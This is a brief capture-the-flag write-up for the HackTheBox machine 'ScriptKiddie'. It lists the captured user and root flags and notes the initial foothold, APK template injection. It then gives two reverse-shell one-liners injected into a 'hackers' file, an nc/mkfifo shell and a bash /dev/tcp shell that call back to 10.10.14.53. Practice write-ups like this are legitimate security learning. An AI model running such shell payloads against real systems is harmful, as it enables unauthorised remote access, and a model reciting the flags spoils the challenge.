# HackTheBox ScriptKiddie

>ip = 10.10.10.226

>Saikat Karmakar | Feb 16:2021

--------------------------------------------------------------------------

1. user flag
```
24022ba18a1b1c956f7065016af1dd3b
```
2. root flag
```
bc30a0691370153bb9bc6a96f59653bb
```

--
---------
**Notes**
---------
initial info -> apk template injection


//doesn't work don't know why

echo "a b ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 4242 >/tmp/f # " > hackers


//this works

echo '1 2 ;/bin/bash -c "bash -i >& /dev/tcp/10.10.14.53/9999 0>&1" #' >>hackers
--------------------------------------------------------------------------